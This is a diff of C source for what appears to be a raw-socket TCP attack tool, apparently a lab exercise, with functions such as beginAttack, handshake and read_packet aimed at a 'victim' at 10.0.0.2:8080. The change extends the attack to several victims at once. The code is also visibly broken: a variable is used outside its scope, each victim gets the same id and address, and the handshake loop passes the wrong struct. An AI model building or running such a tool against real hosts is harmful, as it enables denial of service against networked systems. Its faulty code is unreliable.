@@ -235,6 +235,11 @@ int send_packet(int socket,
 
 }
 
+unsigned getIndex(u_int32_t ip) {
+	unsigned index;
+	index = ip>>24;
+	return index;
+}
 unsigned read_packet(struct victim_connection *m_victim, int sock) {
     // TODO keep reading the socket for a relevent ip
     // update the sequence number
@@ -250,7 +255,7 @@ unsigned read_packet(struct victim_connection *m_victim, int sock) {
         source_socket_address.sin_addr.s_addr = ip_packet->saddr;
         memset(&dest_socket_address, 0, sizeof(dest_socket_address));
         dest_socket_address.sin_addr.s_addr = ip_packet->daddr;
-
+				printf("index: %d \n",getIndex(source_socket_address.sin_addr.s_addr));
         if (source_socket_address.sin_addr.s_addr == m_victim->dst_addr) {
 
           unsigned short iphdrlen;
@@ -339,8 +344,9 @@ void *checkOverruns(void *vargp) {
 int beginAttack(int duration, double target_rate) {
 
     // local variables
-    int sock;
-    struct victim_connection m_victim;  // TODO THIS ASSUMES ONE VICTIM
+    int sock, i;
+		unsigned victims = 2;
+    struct victim_connection m_victims[victims];
     double curr_rate = target_rate / 10;
 
     // TODO Implement
@@ -351,22 +357,28 @@ int beginAttack(int duration, double target_rate) {
       perror("Error while creating socket");
       exit(-1);
     }
-    // Set up each connection struct
-    m_victim.id = 2;
-    m_victim.dst_addr = inet_addr("10.0.0.2");
-    m_victim.dst_port = 8080;//TODO;
-    m_victim.window = MSS;
-    m_victim.had_overrun = 0;
-    m_victim.overrun_ack = 0;
-    m_victim.is_done = 0;
 
-    if (pthread_mutex_init(&(m_victim.lock), NULL) != 0) {
+		// Set up each connection struct
+		for(i=0; i<victims; i++){
+			struct victim_connection m_victim;
+    	m_victim.id = 2;
+    	m_victim.dst_addr = inet_addr("10.0.0.2");
+    	m_victim.dst_port = 8080;//TODO;
+    	m_victim.window = MSS;
+    	m_victim.had_overrun = 0;
+    	m_victim.overrun_ack = 0;
+    	m_victim.is_done = 0;
+			if (pthread_mutex_init(&(m_victim.lock), NULL) != 0) {
         printf("\nFailed to create mutex lock");
         return 1;
-    }
+    	}
+			m_victims[i]=m_victim;
+		}
 
-    // Connect to each server using 3-way handshake
-    handshake(&m_victim, sock);
+    // TODO Connect to each server using 3-way handshake
+		for(i=0; i<victims; i++){
+    	handshake(&m_victim, sock);
+		}
 
     // Get the start ack for each connection
     unsigned read_seq = read_packet(&m_victim, sock);
